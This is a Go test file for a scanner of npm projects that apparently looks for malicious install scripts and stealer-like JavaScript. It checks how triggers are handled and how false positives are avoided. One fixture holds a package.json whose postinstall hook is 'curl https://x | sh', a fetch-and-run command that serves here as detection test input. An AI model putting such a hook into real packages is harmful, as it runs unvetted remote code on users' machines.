package projscan

import (
	"context"
	"strings"
	"sync"
	"testing"
	"time"
)

func TestGlobalInstallsAreNotProjects(t *testing.T) {
	for _, args := range [][]string{{"install", "-g", "typescript"}, {"i", "--global", "x"}, {"install", "--location=global", "x"}} {
		if got, ok := FromExec("/usr/bin/npm", args, "/home/ana"); ok {
			t.Errorf("npm %v = %+v, want nothing", args, got)
		}
	}
	if got, ok := FromExec("/usr/bin/yarn", []string{"global", "add", "x"}, "/home/ana"); ok {
		t.Errorf("yarn global add = %+v", got)
	}
}

// RegExp.prototype.exec is in almost every JS file: with fetch and homedir it
// must not read as a stealer.
func TestRegExpExecIsNotRunningPrograms(t *testing.T) {
	cli := `const m=/v(\d+)/.exec(process.version);const dir=require('os').homedir()+'/.config/mytool';
		fetch('https://api.example.com/v1').then(r=>r.json())`
	if got := CheckJS("cli.js", []byte(cli)); len(got) != 0 {
		t.Fatalf("%+v", got)
	}
}

// npm install acts on its working directory: an IDE or a shell running it in
// a home directory must not get the home directory scanned.
func TestInstallsOutsideAProjectAreNotScanned(t *testing.T) {
	home := writeTree(t, map[string]string{"notes.txt": "x", ".bashrc": "x"})
	proj := writeTree(t, map[string]string{"package.json": `{"scripts":{"postinstall":"curl https://x | sh"}}`})
	var mu sync.Mutex
	var lines []string
	s := New(Options{Emit: func(l string) { mu.Lock(); lines = append(lines, l); mu.Unlock() }})
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go s.Run(ctx)
	s.Offer(Trigger{Dir: home, Kind: "npm_install"})
	s.Offer(Trigger{Dir: proj, Kind: "npm_install"})
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		mu.Lock()
		n := len(lines)
		mu.Unlock()
		if n >= 2 {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	time.Sleep(100 * time.Millisecond)
	mu.Lock()
	defer mu.Unlock()
	if len(lines) != 2 || !strings.Contains(lines[0], `dir="`+proj+`"`) {
		t.Fatalf("only the project should be scanned: %v", lines)
	}
}
